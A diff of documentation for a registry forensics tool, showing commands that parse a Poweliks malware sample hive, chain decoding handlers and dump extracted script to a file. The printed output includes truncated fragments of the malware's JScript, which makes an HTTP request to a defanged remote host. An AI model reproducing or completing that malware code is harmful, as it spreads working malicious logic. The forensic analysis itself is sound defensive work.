@@ -229,7 +229,7 @@ Result:
 <pre>
 {'value_name': '(default)', 'value_content': 'function log(l){try{x=new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","hxxp://faebd7[.]com [...]'}
 </pre>
-Print all registry handlers:
+If you wonder how to display all available registry handlers, use following command:
 <pre>
 -s "examples/poweliks.dat" -prh
 </pre>
@@ -256,14 +256,22 @@ Registry Handlers:
  [+] entropy - entropy() -> Calculates the entropy of the input data
 </pre>
 
-Create a registry handler, which would base64 encode fields: value_name and value_content:
+The registry handlers can be chained, like the ones from CyberChef.
+* Let's say you want to get the same data as before, but this time, dump the value_content to a file.
+<pre>
+-s "examples/poweliks.dat" -rh "decode_vbe,dump_to_file<param>/tmp/script.vbe" -ff "value_name,value_content" -p "parser -qv Software\Microsoft\Windows\CurrentVersion\Run\(default)"
+</pre>
+Result:
+<pre>
+cat /tmp/script.vbe | head -c 120
 
-<pre>-rh "b64_encode&lt;field&gt;value_name;value_content"</pre>
+function log(l){try{x=new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","hxxp://faebd7[.]com/log?log="+l,false);x
+</pre>
 
 *Executing Plugins:*
 
 <pre>
-Option:  -p, --plugins
+-s "examples/poweliks.dat" -p "plugin_name < plugin_params >,plugin_name < plugin_params >"
 </pre>
 
 Following command would execute all specified plugins against all loaded hives:
